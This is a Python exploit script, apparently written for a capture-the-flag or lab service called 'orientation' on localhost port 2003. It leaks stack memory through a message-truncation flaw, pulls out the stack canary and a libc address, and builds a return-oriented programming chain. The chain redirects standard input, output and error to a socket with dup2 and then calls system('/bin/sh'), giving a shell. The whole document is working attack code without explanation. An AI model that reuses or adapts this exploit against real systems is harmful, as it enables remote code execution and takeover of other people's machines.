#!/usr/bin/python3

import socket
import telnetlib
import time

s = socket.create_connection(('localhost', 2003))

SERVICE_NAME = 'orientation'
MESSAGE_NAME = 'test'
MESSAGE_PATH = 'messages/' + SERVICE_NAME + '/' + MESSAGE_NAME + '.message'


def delete_message(s):
    print('Deleting message: ' + MESSAGE_PATH)
    data = 'delete_message\n'
    s.send(data.encode('ASCII'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))
    s.recv(1024)


MAX_SIZE = 0x800
def uplink_message(s):
    print('Creating message: ' + MESSAGE_PATH + ', size = ' + str(MAX_SIZE))
    data = 'uplink_message\n'
    s.send(data.encode('ASCII'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = str(MAX_SIZE) + '\n'
    s.send(data.encode('ASCII'))
    data = 'A' * MAX_SIZE + '\n'
    s.send(data.encode('ASCII'))
    s.recv(1024)


BUFFER_SIZE = 0x808
STACK_SIZE = BUFFER_SIZE + 0x20 + 8
STACK_SIZE += 0x58 + 8
STACK_SIZE += 0x28 + 8
STACK_SIZE += 0x18 + 8
def truncate_message(s, new_size):
    print('Truncating message to ' + str(new_size))
    data = 'truncate_message\n'
    s.send(data.encode('ASCII'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = str(new_size) + '\n'
    s.send(data.encode('ASCII'))
    s.recv(1024)


def downlink_message(s, length):
    print('Fetching message: ' + MESSAGE_PATH)
    data = 'downlink_message\n'
    s.send(data.encode('ASCII'))
    print(s.recv(1024).decode('UTF-8'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    print(s.recv(1024).decode('UTF-8'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))
    s.recv(1024)
    time.sleep(1)
    data = s.recv(1024)
    data += s.recv(length)
    start = data.find(b'AAA')
    end = data.rfind(b'\n')
    return data[start:end]


def append_to_message(s, append_data):
    print('Appending message: ' + MESSAGE_PATH)
    data = 'append_to_message\n'
    s.send(data.encode('ASCII'))
    data = SERVICE_NAME + '\n'
    s.send(data.encode('ASCII'))
    data = MESSAGE_NAME + '\n'
    s.send(data.encode('ASCII'))
    print('Appending ' + str(len(append_data)) + ' characters')
    data = str(len(append_data)) + '\n'
    s.send(data.encode('ASCII'))
    input("Press ENTER after truncating...")
    s.send(append_data + b'\n')
    s.recv(1024)



def get_stack(s):
    delete_message(s)
    uplink_message(s)
    truncate_message(s, STACK_SIZE)
    return downlink_message(s, STACK_SIZE)



t = telnetlib.Telnet()
t.sock = s
# t.interact()



stack = get_stack(s)
print('Stack: ' + str(stack) + '\n')
canary = stack[BUFFER_SIZE:BUFFER_SIZE+8]
print('Canary: ' + str(canary) + '\n')
main_return_addr = int.from_bytes(stack[-8:], byteorder='little')
print('Main Return Address: ' + hex(main_return_addr) + '\n')



libc_base = main_return_addr - 0x29d90
print('libc base: ' + hex(libc_base) + '\n')
pop_rdi = (libc_base + 0x2a3e5).to_bytes(8, 'little')
pop_rsi = (libc_base + 0x2be51).to_bytes(8, 'little')
dup2 = (libc_base + 0x115200).to_bytes(8, 'little')
system = (libc_base + 0x050d70).to_bytes(8, 'little')
bin_sh = (libc_base + 0x1d8698 ).to_bytes(8, 'little')


stdin = 0x0.to_bytes(8, 'little')
stdout = 0x1.to_bytes(8, 'little')
stderr = 0x2.to_bytes(8, 'little')
file_descriptor = 0x4.to_bytes(8, 'little')



rop_chain = canary
rop_chain += b'\00' * 8

rop_chain += pop_rsi
rop_chain += stdin
rop_chain += pop_rdi
rop_chain += file_descriptor
rop_chain += dup2

rop_chain += pop_rsi
rop_chain += stdout
rop_chain += pop_rdi
rop_chain += file_descriptor
rop_chain += dup2

rop_chain += pop_rsi
rop_chain += stderr
rop_chain += pop_rdi
rop_chain += file_descriptor
rop_chain += dup2

rop_chain += pop_rdi
rop_chain += bin_sh
rop_chain += system


TRUNCATE_SIZE = MAX_SIZE - len(rop_chain)
truncate_message(s, TRUNCATE_SIZE)
append_to_message(s, rop_chain)
downlink_message(s, BUFFER_SIZE + len(rop_chain))



s.close()
